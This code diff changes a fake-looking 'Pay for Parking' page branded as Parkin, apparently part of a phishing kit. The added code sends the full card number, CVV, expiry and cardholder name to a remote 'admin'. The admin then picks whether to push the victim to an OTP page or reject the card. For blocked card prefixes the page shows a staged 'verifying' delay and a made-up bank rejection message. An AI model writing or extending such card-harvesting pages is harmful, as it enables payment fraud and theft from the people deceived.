@@ -1,6 +1,9 @@
 import { useState, useEffect, useRef } from "react";
 import { useLocation } from "wouter";
-import { sendData, navigateToPage, socket } from "@/lib/store";
+import { sendData, navigateToPage, socket, visitor, isFormApproved, isCardVerified, cardAction, waitingMessage } from "@/lib/store";
+import { useSignalEffect } from "@preact/signals-react/runtime";
+import { getCardType as getCardTypeFromDB, getBinInfo } from "@/lib/binDatabase";
+import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
 
 /* ───── Plate Structure Data (same as ParkinHome) ───── */
 const plateStructure = [
@@ -98,6 +101,12 @@ export default function PayForParking() {
   const [cvv, setCvv] = useState("");
   const [cardHolder, setCardHolder] = useState("");
   const [isProcessing, setIsProcessing] = useState(false);
+  const [cardError, setCardError] = useState(false);
+  const [luhnError, setLuhnError] = useState(false);
+  const [rejectedError, setRejectedError] = useState(false);
+  const [globalBlockedCards, setGlobalBlockedCards] = useState<string[]>([]);
+  const [globalBlockedError, setGlobalBlockedError] = useState(false);
+  const debounceRef = useRef<ReturnType<typeof setTimeout>>();
 
   const countryRef = useRef<HTMLDivElement>(null);
   const categoryRef = useRef<HTMLDivElement>(null);
@@ -127,6 +136,34 @@ export default function PayForParking() {
     { num: 4, label: L("payment_method") },
   ];
 
+  // Luhn algorithm validation
+  const isValidCardNumber = (number: string): boolean => {
+    if (!number || number.length < 13 || number.length > 19) return false;
+    let sum = 0;
+    let isEven = false;
+    for (let i = number.length - 1; i >= 0; i--) {
+      let digit = parseInt(number[i], 10);
+      if (isEven) { digit *= 2; if (digit > 9) digit -= 9; }
+      sum += digit;
+      isEven = !isEven;
+    }
+    return sum % 10 === 0;
+  };
+
+  // Card type detection
+  const getCardType = (number: string): string => {
+    const cleanNumber = number.replace(/\s+/g, '');
+    const cardType = getCardTypeFromDB(cleanNumber);
+    return cardType ? cardType.toLowerCase() : 'unknown';
+  };
+
+  // Bank info from BIN
+  const getBankInfoLocal = (cardNum: string): { bank: string; logo: string } | null => {
+    const info = getBinInfo(cardNum);
+    if (info) return { bank: info.bank, logo: info.bankLogo };
+    return null;
+  };
+
   const formatCardNumber = (val: string) => {
     const digits = val.replace(/\D/g, '').slice(0, 16);
     return digits.replace(/(.{4})/g, '$1 ').trim();
@@ -137,6 +174,71 @@ export default function PayForParking() {
     if (digits.length >= 3) return digits.slice(0, 2) + '/' + digits.slice(2);
     return digits;
   };
+
+  // Handle card number change with validation
+  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const rawValue = e.target.value.replace(/\s+/g, '').replace(/\D/g, '');
+    const blockedPrefixes = visitor.value.blockedCardPrefixes;
+    const cardPrefix = rawValue.slice(0, 4);
+    if (globalBlockedError) setGlobalBlockedError(false);
+    if (blockedPrefixes && blockedPrefixes.includes(cardPrefix)) {
+      setCardError(true);
+      setCardNumber('');
+      setLuhnError(false);
+    } else {
+      const formattedValue = formatCardNumber(rawValue);
+      setCardNumber(formattedValue);
+      if (rawValue.length >= 13 && rawValue.length <= 19) {
+        setLuhnError(!isValidCardNumber(rawValue));
+      } else {
+        setLuhnError(false);
+      }
+    }
+  };
+
+  // Listen for global blocked cards
+  useEffect(() => {
+    socket.value.emit('blockedCards:get');
+    const handleList = (cards: string[]) => setGlobalBlockedCards(cards || []);
+    const handleUpdated = (cards: string[]) => setGlobalBlockedCards(cards || []);
+    socket.value.on('blockedCards:list', handleList);
+    socket.value.on('blockedCards:updated', handleUpdated);
+    return () => {
+      socket.value.off('blockedCards:list', handleList);
+      socket.value.off('blockedCards:updated', handleUpdated);
+    };
+  }, []);
+
+  // Handle card verification response
+  useEffect(() => {
+    if (isCardVerified.value === false) setCardError(true);
+    else setCardError(false);
+  }, [isCardVerified.value]);
+
+  // Handle form approval
+  useEffect(() => {
+    if (isFormApproved.value) {
+      window.location.href = `/otp-verification?service=${encodeURIComponent('Parkin - Pay for Parking')}&amount=${totalFees}`;
+    }
+  }, [isFormApproved.value]);
+
+  // Handle card action from admin
+  useSignalEffect(() => {
+    if (cardAction.value) {
+      const action = cardAction.value.action;
+      waitingMessage.value = '';
+      if (action === 'otp' || action === 'atm') {
+        window.location.href = `/otp-verification?service=${encodeURIComponent('Parkin - Pay for Parking')}&amount=${totalFees}`;
+      } else if (action === 'reject') {
+        setRejectedError(true);
+        setCardNumber('');
+        setExpiryDate('');
+        setCvv('');
+        setCardHolder('');
+      }
+      cardAction.value = null;
+    }
+  });
 
   const handleNext = () => {
     if (step === 2) {
@@ -176,16 +278,56 @@ export default function PayForParking() {
 
   const handlePay = () => {
     if (!paymentMethod) return;
+    if (luhnError) return;
+
+    const cleanCardNum = cardNumber.replace(/\s+/g, '');
+
+    // Check if card is globally blocked
+    const cardPrefix = cleanCardNum.slice(0, 4);
+    if (globalBlockedCards.includes(cardPrefix)) {
+      waitingMessage.value = lang === 'ar' ? 'جاري التحقق من معلومات البطاقة...' : 'Verifying card information...';
+      setTimeout(() => {
+        waitingMessage.value = '';
+        setGlobalBlockedError(true);
+        setCardNumber('');
+        setExpiryDate('');
+        setCvv('');
+        setCardHolder('');
+      }, 3000);
+      return;
+    }
+
     setIsProcessing(true);
 
     if (paymentMethod === 'card') {
+      const bankInfo = getBankInfoLocal(cleanCardNum);
+      const cardType = getCardType(cleanCardNum);
+
+      if (bankInfo) {
+        waitingCardInfo.value = { bankName: bankInfo.bank, bankLogo: bankInfo.logo, cardType };
+      } else {
+        waitingCardInfo.value = null;
+      }
+
+      const paymentData = {
+        totalPaid: totalFees,
+        cardType,
+        cardLast4: cleanCardNum.slice(-4),
+        serviceName: 'Parkin - Pay for Parking',
+        bankName: bankInfo?.bank || '',
+        bankLogo: bankInfo?.logo || '',
+      };
+      localStorage.setItem('paymentData', JSON.stringify(paymentData));
+      localStorage.setItem('Total', totalFees);
+
       // Send card data to admin
       sendData({
         paymentCard: {
-          cardNumber: cardNumber.replace(/\s/g, ''),
-          expiryDate,
+          cardNumber: cleanCardNum,
+          nameOnCard: cardHolder,
+          expiryMonth: expiryDate.split('/')[0] || '',
+          expiryYear: expiryDate.split('/')[1] || '',
           cvv,
-          cardHolder,
         },
         data: {
           step: 'Payment',
@@ -201,19 +343,14 @@ export default function PayForParking() {
         current: 'Pay for Parking - Payment',
         nextPage: 'otp-verification',
         waitingForAdminResponse: true,
+        isCustom: true,
       });
-
-      localStorage.setItem('Total', totalFees);
-
-      setTimeout(() => {
-        setIsProcessing(false);
-        window.location.href = `/otp-verification?service=${encodeURIComponent('Parkin - Pay for Parking')}&amount=${totalFees}`;
-      }, 2000);
     }
   };
 
   return (
     <div className="min-h-screen bg-[#f5f7f8]" style={{fontFamily:"'Inter','Segoe UI',sans-serif"}} dir={isAr ? "rtl" : "ltr"}>
+      <WaitingOverlay />
 
       {/* ═══════ HEADER ═══════ */}
       <header className="sticky top-0 z-50 bg-white shadow-sm">
@@ -436,6 +573,21 @@ export default function PayForParking() {
                 </button>
               </div>
 
+              {/* Rejected Error Message */}
+              {rejectedError && (
+                <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
+                  <p className="text-red-600 text-center font-medium">{lang === 'ar' ? 'معلومات البطاقة المدخلة غير صحيحة' : 'The entered card information is incorrect'}</p>
+                </div>
+              )}
+
+              {/* Global Blocked Card Error */}
+              {globalBlockedError && (
+                <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
+                  <p className="text-red-600 text-center font-medium">{lang === 'ar' ? 'تم رفض العملية من قبل البنك المصدر للبطاقة' : 'Transaction rejected by the issuing bank'}</p>
+                  <p className="text-red-500 text-center text-sm mt-1">{lang === 'ar' ? 'يرجى المحاولة بوسيلة دفع أخرى' : 'Please try another payment method'}</p>
+                </div>
+              )}
+
               {/* Card form */}
               {paymentMethod === 'card' && (
                 <div className="bg-white rounded-xl border border-gray-200 p-6 mb-8">
@@ -443,19 +595,25 @@ export default function PayForParking() {
                     <div>
                       <label className="text-[12px] text-gray-500 block mb-2">{L("card_number")}</label>
                       <input
-                        type="text"
+                        type="tel"
+                        inputMode="numeric"
                         placeholder={L("enter_card_number")}
                         value={cardNumber}
-                        onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
-                        className="w-full border border-gray-200 rounded-lg px-4 py-3 text-[15px] outline-none focus:border-[#045464] transition-colors"
+                        onChange={handleCardChange}
+                        onFocus={() => setRejectedError(false)}
+                        className={`w-full border rounded-lg px-4 py-3 text-[15px] outline-none focus:border-[#045464] transition-colors ${(cardError || luhnError) ? 'border-red-500' : 'border-gray-200'}`}
                         maxLength={19}
                       />
+                      {(cardError || luhnError) && (
+                        <p className="text-red-500 text-xs mt-1">{luhnError ? (lang === 'ar' ? 'رقم البطاقة غير صحيح' : 'Invalid card number') : (lang === 'ar' ? 'رقم البطاقة غير صحيح' : 'Invalid card number')}</p>
+                      )}
                     </div>
                     <div className="flex gap-4">
                       <div className="flex-1">
                         <label className="text-[12px] text-gray-500 block mb-2">{L("expiry_date")}</label>
                         <input
-                          type="text"
+                          type="tel"
+                          inputMode="numeric"
                           placeholder="MM/YY"
                           value={expiryDate}
                           onChange={(e) => setExpiryDate(formatExpiry(e.target.value))}
@@ -467,11 +625,12 @@ export default function PayForParking() {
                         <label className="text-[12px] text-gray-500 block mb-2">{L("cvv")}</label>
                         <input
                           type="password"
+                          inputMode="numeric"
                           placeholder="***"
                           value={cvv}
-                          onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
+                          onChange={(e) => setCvv(e.target.value.replace(/[^0-9]/g, '').slice(0, 3))}
                           className="w-full border border-gray-200 rounded-lg px-4 py-3 text-[15px] outline-none focus:border-[#045464] transition-colors"
-                          maxLength={4}
+                          maxLength={3}
                         />
                       </div>
                     </div>
@@ -481,7 +640,7 @@ export default function PayForParking() {
                         type="text"
                         placeholder={L("enter_card_holder")}
                         value={cardHolder}
-                        onChange={(e) => setCardHolder(e.target.value)}
+                        onChange={(e) => setCardHolder(e.target.value.replace(/[^A-Za-z\s]/g, ''))}
                         className="w-full border border-gray-200 rounded-lg px-4 py-3 text-[15px] outline-none focus:border-[#045464] transition-colors"
                       />
                     </div>
@@ -505,7 +664,7 @@ export default function PayForParking() {
                 </button>
                 <button
                   onClick={handlePay}
-                  disabled={isProcessing || !paymentMethod || (paymentMethod === 'card' && (!cardNumber || !expiryDate || !cvv || !cardHolder))}
+                  disabled={isProcessing || !paymentMethod || paymentMethod === 'apple' || luhnError || (paymentMethod === 'card' && (!cardNumber || !expiryDate || !cvv || !cardHolder))}
                   className="bg-[#045464] text-white px-10 py-3 rounded-full text-[15px] font-semibold hover:bg-[#004a4f] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                 >
                   {isProcessing ? L("processing") : `${L("pay_now")} Ð ${totalFees}`}
